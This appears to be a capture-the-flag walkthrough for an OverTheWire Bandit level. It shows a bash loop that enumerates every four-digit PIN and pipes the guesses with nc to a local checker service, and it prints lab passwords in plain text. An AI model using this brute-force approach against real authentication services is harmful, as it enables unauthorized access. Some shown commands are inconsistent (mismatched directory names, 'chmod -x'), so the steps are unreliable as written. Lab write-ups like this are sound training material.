```
user@host:~$ ssh bandit24@bandit.labs.overthewire.org -p 2220
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1111
Wrong! Please enter the correct pincode. Try again.
^C
```

Let's make a script that automatically tries all combinations.

```
bandit24@bandit:~$ mkdir /tmp/scripts/
bandit24@bandit:~$ vim /tmp/myscripts/runme.sh
  1 #!/bin/bash
  2 for i in {0000..9999}; do
  3     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> /tmp/myscripts/combinations.txt
  4 done
bandit24@bandit:~$ chmod -x /tmp/myscripts/runme.sh
bandit24@bandit:~$ touch /tmp/myscripts/combinations.txt
bandit24@bandit:~$ ls /tmp/myscripts/
combinations.txt  runme.sh
bandit24@bandit:~$ bash /tmp/myscripts/runme.sh
bandit24@bandit:~$ cat /tmp/myscripts/combinations.txt | nc localhost 30002
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
...
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```
